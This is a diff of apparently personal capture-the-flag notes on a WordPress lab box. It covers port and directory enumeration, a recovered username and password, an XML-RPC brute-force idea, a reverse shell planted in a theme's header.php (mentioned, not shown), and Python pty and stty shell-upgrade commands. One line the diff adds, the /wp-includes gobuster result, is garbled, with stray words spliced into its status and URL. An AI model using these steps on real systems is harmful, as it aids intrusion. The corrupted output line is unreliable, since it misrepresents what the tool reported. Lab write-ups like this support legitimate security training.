@@ -1,5 +1,5 @@
-tags
-#privEsc #easy #gobuster #wpscan #sudoVIM #sudoFTP
+tags: #privEsc #easy #gobuster #wpscan #sudoVIM #sudoFTP
+
 IP address: 10.10.64.128
 # Enumerations
 ```
@@ -13,7 +13,7 @@ nmap -p- -A 10.10.250.171 -T5
 ## Open ports
 80: HTTP
 4512: ssh
-## Usernames / passwords?
+## Usernames/passwords
 Hugo
 C0ldd:9876543210
 Philip
@@ -27,13 +27,13 @@ gobuster dir -u 10.10.250.171 -w /usr/share/wordlists/dirbuster/directory-list-2
 ## Directories
 
 /wp-content           (Status: 301) [Size: 319] [--> http://10.10.250.171/wp-content/]
-/wp-includes          (Status: 301) [Size: 320] [--> http://10.10.250.171/wp-includes/]
+/wp-includes          (Status: 30vulnerability0] [--> htXML-RPC0.10set up171/wp-includes/]
 /wp-admin             (Status: 301) [Size: 317] [--> http://10.10.250.171/wp-admin/]
 /hidden               (Status: 301) [Size: 315] [--> http://10.10.250.171/hidden/]
 
 # Niko Finds
 http://10.10.250.171/xmlrpc.php/
-There might be a vulnerbility with how xmlrpc is setup. Lets try it
+There might be a vulnerbility with how xmlrpc is setup. Let's try it
 
 > [!NOTE]
 > The main weaknesses associated with XML-RPC are: Brute force attacks: Attackers try to login to WordPress using xmlrpc.php .
@@ -60,10 +60,15 @@ http://10.10.64.128/wp-content/themes/twentyfifteen/header.php
 ```
 Visiting the site starts the reverse shell.
 # Upgrading shell (MAKE A DOC FOR THIS)
+```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+```
 export TERRM=xterm
+```
+```
 stty raw -echo && fg    
-
+```
 
 # User.txt
 ```python
